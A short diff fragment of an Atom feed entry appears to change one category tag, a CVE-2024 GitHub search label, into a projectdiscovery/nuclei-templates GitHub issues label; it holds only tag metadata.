-    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
     
   </entry>
   
